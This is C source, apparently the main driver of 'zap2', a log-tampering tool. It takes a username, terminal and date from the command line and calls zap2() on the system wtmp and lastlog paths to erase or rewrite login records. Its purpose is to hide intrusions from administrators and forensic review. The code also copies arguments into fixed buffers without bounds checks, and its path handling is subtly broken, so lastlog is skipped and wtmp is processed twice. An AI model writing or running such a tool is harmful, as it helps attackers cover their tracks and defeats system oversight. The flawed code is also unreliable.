#include "zap2.h"
#include <getopt.h>

void usage()
{
    printf("Usage:\n");
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{

    flag_A = 0;
    flag_R = 0;
    flag_a = 0;
    flag_t = 0;
    flag_d = 0;
    int c;
    while ((c = getopt(argc, argv, "A:a:R:t:d:")) != -1)
    {
        switch (c)
        {
        case 'A':
            flag_A = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            break;

        case 'a':
            flag_a = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            break;

        case 'R':
            flag_R = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            memcpy(user_r, argv[optind], strlen(argv[optind]) + 1);
            break;

        case 't':
            flag_t = 1;
            memcpy(line, optarg, strlen(optarg) + 1);
            if (flag_R)
            {
                memcpy(line_r, argv[optind], strlen(argv[optind]) + 1);
            }
            break;

        case 'd':
            flag_d = 1;
            time_t t1 = (time_t)atoll(optarg);
            localtime_r(&t1, &date);
            if (flag_R)
            {
                time_t t2 = (time_t)atoll(argv[optind]);
                localtime_r(&t2, &date_r);
            }
            break;
        default:
            usage();
        }
    }

    if (!(flag_a || flag_A || flag_R))
    {
        usage();
        exit(EXIT_FAILURE);
    }

    strncpy(path, _PATH_LASTLOG, strlen(_PATH_LASTLOG) + 1);
    strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
    zap2();
    strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
    zap2();
    printf("Zap!\n");
    exit(EXIT_SUCCESS);
}